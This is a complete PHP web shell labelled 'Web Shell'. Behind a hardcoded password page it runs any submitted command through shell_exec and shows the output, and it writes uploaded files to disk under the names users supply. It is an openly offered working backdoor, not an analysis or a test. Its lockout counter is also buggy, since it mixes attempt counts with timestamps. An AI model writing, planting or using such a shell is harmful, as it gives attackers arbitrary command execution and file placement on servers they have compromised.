<?php
session_start();

// Verificar y manejar el bloqueo después de 5 intentos de contraseña incorrecta
$maxAttempts = 5;
$lockoutTime = 30; // segundos
$lockoutKey = 'lockout_timer';

if (!isset($_SESSION[$lockoutKey])) {
    $_SESSION[$lockoutKey] = 0;
}

if ($_SESSION[$lockoutKey] > time()) {
    $timeRemaining = $_SESSION[$lockoutKey] - time();
    echo "<p style='color: red; text-align: center;'>Too many failed attempts. Please try again after $timeRemaining seconds.</p>";
    exit();
}

// Check if the form is submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    // Define the expected password
    $expectedPassword = 'Arquero99.+';

    // Get the entered password from the form
    $enteredPassword = $_POST['password'];

    // Check if the entered password matches the expected password
    if ($enteredPassword === $expectedPassword) {
        // Password is correct, reset the counter and set the session variable
        $_SESSION['authenticated'] = true;
        $_SESSION[$lockoutKey] = 0; // Reset counter
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit();
    } else {
        // Password is incorrect, increment the counter
        $_SESSION[$lockoutKey]++;
        // If it reaches the maximum attempts, set the lockout time
        if ($_SESSION[$lockoutKey] >= $maxAttempts) {
            $_SESSION[$lockoutKey] = time() + $lockoutTime;
        }
        // Display an error message
        echo '<p style="color: red; text-align: center;">Invalid password. Access denied.</p>';
    }
}

// Check if the user is not logged in, display the login form
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Web Shell</title>
        <style>
            body {
                font-family: 'Courier New', Courier, monospace;
                margin: 0;
                padding: 0;
                background-color: #111;
                color: #0f0;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
            }
            .container {
                background-color: #333;
                padding: 40px;
                border-radius: 8px;
                box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
            }
            h2 {
                color: #0f0;
                text-align: center;
            }
            .login-form {
                text-align: center;
                margin-bottom: 20px;
            }
            input[type="password"] {
                padding: 8px;
                border-radius: 4px;
                border: 1px solid #0f0;
                background-color: #000;
                color: #0f0;
                font-family: 'Courier New', Courier, monospace;
                letter-spacing: 1px;
                margin-right: 10px;
            }
            .btn-container {
                margin-top: 10px;
            }
            button {
                padding: 10px 20px;
                border: none;
                background-color: #f00; /* Cambiado a rojo */
                color: #fff;
                border-radius: 4px;
                cursor: pointer;
                font-family: 'Courier New', Courier, monospace;
                letter-spacing: 1px;
                transition: background-color 0.3s ease;
                margin-left: 10px;
            }
            button:hover {
                background-color: #ff5555; /* Cambiado a tono más claro de rojo al hacer hover */
            }
        </style>
    </head>
    <body>
    <div class="container">
        <h2>Welcome to Web Shell</h2>
        <div class="login-form">
            <form method="POST" action="">
                <input type="password" name="password" placeholder="Enter Password" autocomplete="off" autofocus required>
                <div class="btn-container">
                    <button type="submit">Login</button>
                </div>
            </form>
        </div>
    </div>
    </body>
    </html>
    <?php
    // Detener la ejecución del resto del script
    exit();
}

// Si el usuario está autenticado, muestra el contenido del shell web
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web Shell</title>
    <style>
        body {
            font-family: 'Courier New', Courier, monospace;
            margin: 0;
            padding: 0;
            background-color: #111;
            color: #0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: #333;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
        }
        h2 {
            color: #0f0;
            text-align: center;
        }
        .shell {
            margin-top: 20px;
            padding: 20px;
            background-color: #000;
            border: 1px solid #0f0;
            border-radius: 8px;
            max-width: 600px;
        }
        input[type="text"] {
            padding: 8px;
            border-radius: 4px;
            border: 1px solid #0f0;
            background-color: #000;
            color: #0f0;
            font-family: 'Courier New', Courier, monospace;
            letter-spacing: 1px;
            width: 80%;
            margin-bottom: 10px; /* Añadida separación entre la caja de texto y los botones */
        }
        .btn-container {
            text-align: center;
        }
        button {
            padding: 10px 20px;
            border: none;
            background-color: #f00; /* Cambiado a rojo */
            color: #fff;
            border-radius: 4px;
            cursor: pointer;
            font-family: 'Courier New', Courier, monospace;
            letter-spacing: 1px;
            transition: background-color 0.3s ease;
            margin-left: 10px;
        }
        button:hover {
            background-color: #ff5555; /* Cambiado a tono más claro de rojo al hacer hover */
        }
    </style>
</head>
<body>
<div class="container">
    <h2>Welcome to Web Shell</h2>

    <!-- Shell interactivo -->
    <div class="shell">
        <h2>Interactive Shell</h2>
        <form method="POST" action="">
            <input type="text" name="command" placeholder="Enter Command" autocomplete="off" autofocus required />
            <div class="btn-container">
                <button type="submit">Execute</button>
            </div>
        </form>
        <?php
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
            $command = $_POST['command'];
            echo '<pre>';
            echo 'Command: ' . $command . "\n";
            echo 'Output:' . "\n";
            echo shell_exec($command);
            echo '</pre>';
        }
        ?>
    </div>

    <!-- Subida de archivos -->
    <div class="shell">
        <h2>File Upload</h2>
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="file" required />
            <div class="btn-container">
                <button type="submit">Upload</button>
            </div>
        </form>
        <?php
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
            $file = $_FILES['file'];
            $fileName = $file['name'];
            $fileTmpName = $file['tmp_name'];
            if (move_uploaded_file($fileTmpName, $fileName)) {
                echo "<p style='color: green;'>File uploaded successfully.</p>";
            } else {
                echo "<p style='color: red;'>Error uploading file.</p>";
            }
        }
        ?>
    </div>

    <!-- Cerrar sesión -->
    <h2>Logout</h2>
    <form method="POST" action="">
        <input type="hidden" name="logout" value="true" />
        <div class="btn-container">
            <button type="submit">Logout</button>
        </div>
    </form>
    <?php
    if (isset($_POST['logout']) && $_POST['logout'] === 'true') {
        // Destruir la sesión y redirigir al formulario de inicio de sesión
        session_destroy();
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit();
    }
    ?>
</div>
</body>
</html>
